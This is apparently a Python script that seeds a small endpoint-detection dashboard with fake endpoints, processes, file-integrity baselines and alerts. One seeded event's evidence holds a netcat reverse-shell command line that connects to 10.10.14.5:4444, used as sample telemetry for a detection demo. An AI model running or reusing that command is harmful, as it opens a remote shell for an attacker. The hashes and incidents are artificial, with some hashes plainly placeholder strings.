"""Seed rich, realistic demo data into Mini EDR SQLite database.

Populates:
- 3 Realistic Linux Endpoints (Online / Offline status with CPU, RAM, Disk).
- Process snapshots and observations (including suspicious binaries in /tmp).
- FIM Baselines (monitored sensitive files like /etc/passwd, /etc/shadow).
- Security events (suspicious spawn, sensitive file tampering).
- Security alerts across severity levels (Critical, High, Medium) with evidence.
"""

from datetime import datetime, timezone
from pathlib import Path
import sqlite3
import sys

# Ensure project root is in sys.path
PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from server.app import create_app
from server.repositories.alert_repository import AlertRepository
from server.repositories.baseline_repository import BaselineRepository
from server.repositories.endpoint_repository import EndpointRepository
from server.repositories.event_repository import EventRepository
from server.repositories.process_repository import ProcessRepository


def utc_now():
    return datetime.now(timezone.utc).isoformat()


def seed():
    app = create_app()
    db_path = app.config["DATABASE_PATH"]
    print(f"[*] Seeding demo telemetry into: {db_path}")

    endpoint_repo = EndpointRepository(db_path)
    proc_repo = ProcessRepository(db_path)
    baseline_repo = BaselineRepository(db_path)
    event_repo = EventRepository(db_path)
    alert_repo = AlertRepository(db_path)

    now = utc_now()
    old_time = "2026-11-04T10:00:00Z"

    # 1. Endpoints
    print("[+] Seeding endpoints...")
    endpoint_repo.upsert({
        "agent_id": "endpoint-kali-soc",
        "hostname": "kali-soc-master",
        "os": "Kali GNU/Linux Rolling",
        "ip_address": "192.168.1.100",
        "agent_version": "1.0.0",
        "cpu_percent": 34.2,
        "memory_percent": 56.4,
        "disk_percent": 42.1,
        "uptime_seconds": 38400,
        "last_seen": now,
    })

    endpoint_repo.upsert({
        "agent_id": "endpoint-ubuntu-prod",
        "hostname": "ubuntu-web-prod-01",
        "os": "Ubuntu 24.04 LTS",
        "ip_address": "10.0.0.15",
        "agent_version": "1.0.0",
        "cpu_percent": 88.5,
        "memory_percent": 79.2,
        "disk_percent": 68.0,
        "uptime_seconds": 1284500,
        "last_seen": now,
    })

    endpoint_repo.upsert({
        "agent_id": "endpoint-debian-db",
        "hostname": "debian-db-backup",
        "os": "Debian GNU/Linux 12",
        "ip_address": "10.0.0.99",
        "agent_version": "1.0.0",
        "cpu_percent": 12.0,
        "memory_percent": 32.5,
        "disk_percent": 89.0,
        "uptime_seconds": 45000,
        "last_seen": old_time,
    })

    # 2. Process Snapshots
    print("[+] Seeding process observations...")
    proc_repo.create_snapshot({
        "message_id": f"msg-snap-prod-{now}",
        "schema_version": "1.0",
        "agent_id": "endpoint-ubuntu-prod",
        "process_count": 4,
        "collected_at": now,
        "received_at": now,
    }, [
        {
            "pid": 1337,
            "ppid": 890,
            "process_name": "nc",
            "username": "www-data",
            "exe_path": "/tmp/nc",
            "cpu_percent": 86.4,
            "memory_percent": 14.2,
            "rss_bytes": 2048576,
            "process_started_at": now,
        },
        {
            "pid": 890,
            "ppid": 1,
            "process_name": "nginx",
            "username": "www-data",
            "exe_path": "/usr/sbin/nginx",
            "cpu_percent": 4.1,
            "memory_percent": 18.0,
            "rss_bytes": 16777216,
            "process_started_at": now,
        },
        {
            "pid": 2045,
            "ppid": 1,
            "process_name": "python3",
            "username": "root",
            "exe_path": "/usr/bin/python3",
            "cpu_percent": 1.2,
            "memory_percent": 22.0,
            "rss_bytes": 33554432,
            "process_started_at": now,
        },
        {
            "pid": 4120,
            "ppid": 1,
            "process_name": "systemd-journald",
            "username": "root",
            "exe_path": "/usr/lib/systemd/systemd-journald",
            "cpu_percent": 0.5,
            "memory_percent": 6.0,
            "rss_bytes": 8388608,
            "process_started_at": now,
        },
    ])

    # 3. File Baselines
    print("[+] Seeding FIM baselines...")
    sensitive_files = [
        ("/etc/passwd", "38c5efb0e00beae3f3a763ef8b2575fe7bc4878a9c2ecad1973b7a5449755b76", 2640, 0o644),
        ("/etc/shadow", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", 1450, 0o640),
        ("/etc/sudoers", "a2c34f5e6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e", 1820, 0o440),
        ("/etc/ssh/sshd_config", "d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5", 3450, 0o600),
    ]
    for path, sha, size, mode in sensitive_files:
        baseline_repo.upsert({
            "agent_id": "endpoint-ubuntu-prod",
            "file_path": path,
            "sha256": sha,
            "file_size_bytes": size,
            "mtime_ns": 1700000000000000000,
            "file_mode": mode,
            "state": "present",
        })

    # 4. Security Events
    print("[+] Seeding security events...")
    ev1 = event_repo.record({
        "message_id": f"ev-revshell-{now}",
        "agent_id": "endpoint-ubuntu-prod",
        "event_type": "suspicious_process_spawn",
        "severity": "critical",
        "source": "detection",
        "title": "Reverse Shell Spawned from /tmp",
        "description": "Process /tmp/nc executed by www-data initiating outbound network connection to 10.10.14.5:4444",
        "evidence_json": {
            "pid": 1337,
            "process_name": "nc",
            "exe_path": "/tmp/nc",
            "username": "www-data",
            "cmdline": "/tmp/nc -e /bin/sh 10.10.14.5 4444",
            "cpu_percent": 86.4,
            "risk_score": 95,
        },
        "occurred_at": now,
        "received_at": now,
    })

    ev2 = event_repo.record({
        "message_id": f"ev-fim-shadow-{now}",
        "agent_id": "endpoint-ubuntu-prod",
        "event_type": "fim_sensitive_file",
        "severity": "high",
        "source": "detection",
        "title": "Unauthorized Modification of /etc/shadow",
        "description": "SHA-256 hash changed on Linux credential store /etc/shadow",
        "evidence_json": {
            "file_path": "/etc/shadow",
            "previous_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "current_sha256": "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
            "risk_score": 85,
        },
        "occurred_at": now,
        "received_at": now,
    })

    ev3 = event_repo.record({
        "message_id": f"ev-fim-tmp-{now}",
        "agent_id": "endpoint-ubuntu-prod",
        "event_type": "fim_file_created",
        "severity": "medium",
        "source": "agent",
        "title": "New Executable Dropped in /tmp",
        "description": "Binary /tmp/pwn_script.sh created in world-writable directory",
        "evidence_json": {
            "file_path": "/tmp/pwn_script.sh",
            "file_size_bytes": 1024,
            "file_mode": 0o755,
        },
        "occurred_at": now,
        "received_at": now,
    })

    # 5. Alerts
    print("[+] Seeding alerts...")
    alert_repo.create_or_update({
        "alert_key": "alert:endpoint-ubuntu-prod:proc_reverse_shell",
        "agent_id": "endpoint-ubuntu-prod",
        "rule_id": "proc_reverse_shell",
        "title": "Active Reverse Shell Spawned (/tmp/nc)",
        "description": "High-risk interactive reverse shell executing under service account www-data from temporary storage",
        "severity": "critical",
        "status": "new",
        "first_seen_at": now,
        "last_seen_at": now,
    }, event_ids=[ev1["id"]])

    alert_repo.create_or_update({
        "alert_key": "alert:endpoint-ubuntu-prod:fim_sensitive_file",
        "agent_id": "endpoint-ubuntu-prod",
        "rule_id": "fim_sensitive_file",
        "title": "Critical Authentication Store Tampered (/etc/shadow)",
        "description": "Cryptographic baseline integrity mismatch detected on sensitive authentication file",
        "severity": "high",
        "status": "acknowledged",
        "first_seen_at": now,
        "last_seen_at": now,
        "acknowledged_at": now,
        "resolution_note": "SOC Tier 1 actively triaging system authentication logs",
    }, event_ids=[ev2["id"]])

    alert_repo.create_or_update({
        "alert_key": "alert:endpoint-ubuntu-prod:proc_suspicious_dir",
        "agent_id": "endpoint-ubuntu-prod",
        "rule_id": "proc_suspicious_dir",
        "title": "Suspicious Binary Dropped in /tmp",
        "description": "Executable file created in /tmp folder",
        "severity": "medium",
        "status": "new",
        "first_seen_at": now,
        "last_seen_at": now,
    }, event_ids=[ev3["id"]])

    print("[✓] Demo data successfully seeded!")
    print("    - 3 Endpoints (2 Online, 1 Offline)")
    print("    - 3 Security Incidents (1 Critical, 1 High, 1 Medium)")
    print("    - 3 Security Events with JSON evidence")


if __name__ == "__main__":
    seed()
